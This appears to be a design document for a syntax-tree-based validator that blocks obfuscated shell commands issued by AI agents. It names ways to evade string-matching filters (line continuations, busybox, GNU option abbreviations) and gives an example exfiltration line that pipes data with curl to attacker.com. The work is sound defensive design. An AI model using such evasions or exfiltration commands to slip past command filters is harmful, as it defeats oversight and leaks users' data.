# Design Doc: Grammatical Command Validator (GCV)
**Status:** Draft
**Created:** 2026-04-03

## 1. Context and Scope
Existing security boundaries for AI agents (OpenClaw, Claude Code) rely on lexical (string-matching) filters to approve or deny shell commands. Recent exploits have demonstrated that these filters are easily bypassed using shell line continuations (`\`), multiplexing (`busybox`), or GNU option abbreviations. MCP Any needs a more robust, AST-aware validation layer that understands the grammar of the command before execution.

## 2. Goals & Non-Goals
* **Goals:**
    * Perform deep Abstract Syntax Tree (AST) decomposition of all shell-based tool calls.
    * Detect and block obfuscation techniques like line continuation and command nesting.
    * Provide a framework-agnostic validation interface for all connected agents.
* **Non-Goals:**
    * Replacing the host shell entirely.
    * Validating non-shell tool calls (e.g., HTTP APIs) - these are handled by the Policy Firewall.

## 3. Critical User Journey (CUJ)
* **User Persona:** Security-conscious Developer using an AI Swarm.
* **Primary Goal:** Prevent an agent from executing `curl` or `wget` even if obfuscated through a complex multi-stage pipeline.
* **The Happy Path (Tasks):**
    1. Agent generates a command: `echo "malicious script" | \  curl -X POST --data-binary @- http://attacker.com`.
    2. MCP Any intercepts the tool call.
    3. GCV decomposes the command into an AST.
    4. GCV identifies the `curl` node despite the line continuation.
    5. GCV checks against the `deny` policy for `curl`.
    6. GCV blocks the entire pipeline and returns a "Security Violation" response to the agent.

## 4. Design & Architecture
* **System Flow:**
    `Agent Tool Call` -> `GCV Interceptor` -> `Shell Parser (AST Gen)` -> `Node-Level Policy Check` -> `Execution/Block`
* **APIs / Interfaces:**
    * `ValidateCommand(cmd string) (ValidationResult, error)`: Core internal API.
* **Data Storage/State:**
    Uses the existing Policy Engine's rules but applies them to the nodes of the generated AST.

## 5. Alternatives Considered
* **Regex Hardening:** Rejected. Shell grammar is too complex for regular expressions to handle all edge cases (busybox, abbreviations).
* **Restricted Shell (rbash):** Rejected. Too restrictive for many legitimate development tasks and doesn't solve the "Command-as-Data" problem in pipelines.

## 6. Cross-Cutting Concerns
* **Security (Zero Trust):** GCV is a core pillar of the Zero Trust architecture, moving from "Allow-list" strings to "Allow-list" grammatical structures.
* **Observability:** Every GCV violation is logged with the full AST decomposition to help developers refine policies.

## 7. Evolutionary Changelog
* **2026-04-03:** Initial Document Creation.
